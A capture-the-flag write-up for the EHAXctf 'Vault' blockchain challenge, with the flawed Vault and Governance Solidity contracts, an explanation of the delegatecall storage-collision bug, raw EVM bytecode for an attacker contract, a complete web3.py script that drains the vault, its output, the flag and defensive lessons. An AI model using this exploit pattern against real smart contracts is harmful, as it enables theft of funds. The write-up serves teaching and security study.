# Vault — EHAXctf Blockchain

**Category:** Blockchain
**Description:** "The government has released a new vault and now we can add proposals too, what?? Drain the VAULT"
**Remote:** `nc 135.235.193.111 1337`
**Flag:** `EH4X{c4ll1ng_m4d3_s000_e45y_th4t_my_m0m_d03snt_c4ll_m3}`

---

## Initial Analysis

### Contracts

**Vault.sol** — Holds 5 ETH, must drain to 0:
```solidity
contract Vault {
    bool public paused;       // slot 0 (packed with fee)
    uint248 public fee;       // slot 0
    address public admin;     // slot 1
    address public governance;// slot 2

    function execute(bytes calldata data) public {
        (bool ok,) = governance.delegatecall(data);
        require(ok);
    }

    function withdraw() public {
        require(!paused, "paused");
        require(msg.sender == admin, "not admin");
        payable(msg.sender).transfer(address(this).balance);
    }

    function setGovernance(address _g) public {  // NO ACCESS CONTROL!
        governance = _g;
    }
}
```

**Governance.sol** — Simple proposal counter:
```solidity
contract Governance {
    uint256 public proposalCount;  // slot 0
    function setProposal(uint256 x) public {
        proposalCount = x;
    }
}
```

### Initial State
- Vault: 5 ETH, `paused=true`, `admin=deployer`
- Player: 10000 ETH, no admin privileges

## Vulnerabilities

**Three critical bugs that chain together:**

### 1. `setGovernance()` has no access control
```solidity
function setGovernance(address _g) public {  // ANYONE can call
    governance = _g;
}
```
Any user can change the governance contract.

### 2. `execute()` uses unrestricted `delegatecall`
```solidity
function execute(bytes calldata data) public {
    (bool ok,) = governance.delegatecall(data);
    require(ok);
}
```
`delegatecall` executes the target contract's code in the **Vault's storage context**. This means the governance code can read/write ANY slot in the Vault.

### 3. Storage collision via `delegatecall`

| Slot | Vault | Governance |
|------|-------|------------|
| 0 | `paused` + `fee` | `proposalCount` |
| 1 | `admin` | (nothing) |
| 2 | `governance` | (nothing) |

A `delegatecall` to `Governance.setProposal(0)` writes 0 to slot 0 of the **Vault**, setting `paused=false`.

## Exploit

### Strategy
1. Deploy malicious contract with bytecode that does `sstore(0, 0)` + `sstore(1, caller())`
2. Call `setGovernance(evil)` — no auth, works
3. Call `execute()` — delegatecall to our contract, writes to Vault's storage
4. Call `withdraw()` — now `paused=false` and `admin=player`

### Malicious Contract (raw EVM bytecode)

Runtime (10 bytes):
```
PUSH1 0x00   ; 60 00
PUSH1 0x00   ; 60 00
SSTORE       ; 55     -> slot[0] = 0 (paused = false)
CALLER       ; 33
PUSH1 0x01   ; 60 01
SSTORE       ; 55     -> slot[1] = caller (admin = player)
STOP         ; 00
```

Constructor (11 bytes) — copies runtime to memory and returns it:
```
PUSH1 0x0a   ; runtime length
DUP1
PUSH1 0x0b   ; offset = constructor length (11)
PUSH1 0x00
CODECOPY     ; copy runtime to memory
PUSH1 0x00
RETURN       ; return runtime
```

### Exploit Script

```python
#!/usr/bin/env python3
"""
EHAXctf - Vault (Blockchain)
Drain the vault via delegatecall + no-auth setGovernance
"""
from web3 import Web3
from eth_account import Account
import socket, re, time

# Connect and keep socket alive
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(30)
sock.connect(("135.235.193.111", 1337))
time.sleep(3)
data = b''
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
    except: break

banner = data.decode()
RPC_URL = re.search(r'RPC URL\s*:\s*(http://\S+)', banner).group(1)
VAULT_ADDR = re.search(r'Vault\s*:\s*(0x\S+)', banner).group(1)
PLAYER_KEY = re.search(r'Private Key:\s*(0x\S+)', banner).group(1)

w3 = Web3(Web3.HTTPProvider(RPC_URL))
player = Account.from_key(PLAYER_KEY)
chain_id = w3.eth.chain_id
nonce = w3.eth.get_transaction_count(player.address)

vault_abi = [
    {"inputs":[],"name":"paused","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"admin","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"data","type":"bytes"}],"name":"execute","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"_g","type":"address"}],"name":"setGovernance","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"},
]
vault = w3.eth.contract(address=VAULT_ADDR, abi=vault_abi)

def send_raw(data_hex, to=None, value=0):
    global nonce
    tx = {'nonce': nonce, 'to': to, 'value': value, 'gas': 3000000,
          'gasPrice': w3.eth.gas_price, 'chainId': chain_id, 'data': data_hex}
    signed = player.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    nonce += 1
    return receipt

# Deploy: sstore(0,0) + sstore(1,caller) + stop
runtime_hex = "60006000553360015500"
ctor = bytes([0x60, len(bytes.fromhex(runtime_hex)), 0x80, 0x60, 0x0b, 0x60, 0x00, 0x39, 0x60, 0x00, 0xf3])
r = send_raw('0x' + ctor.hex() + runtime_hex)
evil = r.contractAddress

# setGovernance(evil) — no access control!
set_gov = vault.functions.setGovernance(evil).build_transaction(
    {'from': player.address, 'nonce': nonce, 'gas': 500000, 'gasPrice': w3.eth.gas_price, 'chainId': chain_id})
send_raw(set_gov['data'], to=VAULT_ADDR)

# execute() — delegatecall writes to Vault storage
exec_tx = vault.functions.execute(b'').build_transaction(
    {'from': player.address, 'nonce': nonce, 'gas': 3000000, 'gasPrice': w3.eth.gas_price, 'chainId': chain_id})
send_raw(exec_tx['data'], to=VAULT_ADDR)

# withdraw() — paused=false, admin=player
wd = vault.functions.withdraw().build_transaction(
    {'from': player.address, 'nonce': nonce, 'gas': 500000, 'gasPrice': w3.eth.gas_price, 'chainId': chain_id})
send_raw(wd['data'], to=VAULT_ADDR)

print(f"Solved: {vault.functions.isSolved().call()}")
sock.send(b"1\n")
time.sleep(2)
print(sock.recv(4096).decode())
sock.close()
```

### Execution
```
$ python3 solve.py

[1] Deploy evil contract...
    Deployed: 0x8464... (status=1)
    Runtime code: 60006000553360015500

[2] setGovernance(evil)...
    Done (status=1)

[3] execute() delegatecall...
    Paused: False
    Admin: 0x70997... (player)

[4] withdraw()...
    Withdraw (status=1)

Balance: 0 wei
Solved: True

FLAG: EH4X{c4ll1ng_m4d3_s000_e45y_th4t_my_m0m_d03snt_c4ll_m3}
```

## Flag

```
EH4X{c4ll1ng_m4d3_s000_e45y_th4t_my_m0m_d03snt_c4ll_m3}
```

## Key Lessons

1. **`delegatecall` is extremely dangerous**: It executes external code in the calling contract's storage context. If the target is attacker-controllable, it can overwrite ANY state variable.

2. **Access control is fundamental**: `setGovernance()` without `require(msg.sender == admin)` lets anyone change the delegatecall target. A single `onlyAdmin` modifier would have prevented the attack.

3. **Storage layout matters with delegatecall**: In a delegatecall, storage writes use the calling contract's slots, not the called contract's. By deploying a contract with raw SSTORE, we can write to any arbitrary Vault slot.

4. **Raw EVM bytecode for maximum flexibility**: No Solidity needed to deploy a contract. 10 bytes of raw bytecode are enough to overwrite `paused` and `admin`.

## Files

```
blockchain/
├── Vault.sol       # Vulnerable contract
├── Governance.sol  # Legitimate governance contract
├── solve.py        # Full exploit (web3.py)
├── flag.txt        # Captured flag
└── solution.md     # This writeup
```
